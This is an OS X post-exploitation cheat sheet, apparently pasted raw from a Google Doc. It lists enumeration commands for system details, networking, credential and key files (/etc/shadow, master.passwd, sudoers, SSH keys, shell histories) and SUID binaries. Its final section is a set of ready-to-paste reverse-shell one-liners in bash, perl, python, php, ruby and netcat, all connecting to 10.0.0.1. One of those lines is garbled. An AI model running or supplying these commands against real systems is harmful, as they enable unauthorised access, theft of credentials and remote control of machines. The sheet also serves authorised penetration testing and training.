
# OS X Google Doc Content #

The content below is the raw data from the Google Doc that was first used to collect it. Over time, this content will be moved into sub-pages and organized but is placed here, now, so as to be more complete. We apologize for its appearance.

----

## Blind Files 
(things to pull when all you can do is blindly read) LFI/dir traversal
/etc/resolv.conf (everyone always has read on this and it wont trigger an IDS)

## System
<code>uname -a
ps aux
ps -aef
id
arch
w
who -a
gcc -v
mysql --version
perl -v
ruby -v
python --version
df -k
mount
last -a
lastlogin (*bsd)
getenforce  <- does not work on Lion no idea if this work in previous versions
dmesg
lsusb<- does not work on Lion no idea it this work on previous versions
lshw  <- does not work on Lion no idea it this work on previous versions
free -m  <- does not work on Lion no idea it this work on previous versions
du -h --max-depth=1 /
which nmap (see if it's already installed)
locate bin/nmap
which nc (see if it's already installed)
locate bin/<whatever you want>
whoami
jps -l
java -version</code>

## Networking
<code>hostname -f
ip addr show
ifconfig -a
route -n
cat /etc/network/interfaces
iptables -L -n
netstat -anop
netstat -r
netstat -nltupw (root with raw sockets)
arp -a
lsof -nPi</code>

## Configs
<code>ls -aRl /etc/ | awk '$1 ~ /w.$/' | grep -v lrwx 2>/dev/null
cat /etc/issue{,.net}
cat /etc/passwd
cat /etc/shadow (gotta try..)
cat /etc/shadow~ # (sometimes there when edited with gedit)
cat /etc/master.passwd
cat /etc/group
cat /etc/hosts
cat /etc/crontab
cat /etc/sysctl.conf
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)
cat /etc/resolv.conf
cat /etc/samba/smb.conf
pdbedit -L -w
pdbedit -L -v
cat /etc/exports
cat /etc/auto.master
cat /etc/auto_maste
cat /etc/fstab
cat /etc/exports
find /etc/sysconfig/ -type f -exec cat {} \;
cat /etc/sudoers</code>

## Package Sources
<code>cat /etc/apt/sources.list
ls -l /etc/yum.repos.d/
cat  /etc/yum.conf</code>

## Finding Important Files
<code>find /var/log -type f -exec ls -la {} \;
ls -alhtr /mnt
ls -alhtr /Volumes
ls -alhtr /tmp
ls -alhtr /home
ls /Users/*/.ssh/*
find /home -type f -iname '.*history'
ls -lart /etc/rc.d/
locate tar | grep [.]tar$
locate tgz | grep [.]tgz$
locate sql l grep [.]sql$
locate settings | grep [.]php$
locate config.inc | grep [.]php$
ls /Users/*/id*
locate .properties | grep [.]properties # java config files
locate .xml | grep [.]xml # java/.net config files
find /sbin /usr/sbin /opt /lib `echo $PATH | 'sed s/:/ /g'` -perm -4000 # find suids</code>

## Per User
<code>ls -alh /Users/*/
ls -alh /Users/*/.ssh/
cat /Users/*/.ssh/authorized_keys
cat /Users/*/.ssh/known_hosts
cat /Users/*/.*hist*
find -type f /Users/*/.vnc /Users/*/.subversion
grep ^ssh /Users/*/.*hist*
grep ^telnet `/Users/*/.*hist*
grep ^mysql /Users/*/.*hist*
cat /Users/*/.viminfo
sudo -l # if sudoers is not readable, this sometimes works per user
crontab -l</code>

## Priv (sudo'd or as root)
<code>ls -alh /root/
cat /etc/sudoers
cat /etc/shadow
cat /etc/master.passwd # OpenBSD
cat /var/spool/cron/crontabs/*
lsof -nPi
ls /Users/*/.ssh/*</code>

## Reverse Shell
<code>starting list sourced from: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 # No /dev/tcp on Mac OS X
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
nc -e /bin/sh 10.0.0.1 1234 # note need -l on some versions, and many does NOT support -e anymore
rm /tmp/;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
xterm -display 10.0.0.1:1
Listener-     Xnest :1
Add permission to connect-  xhost +victimIPf</code>
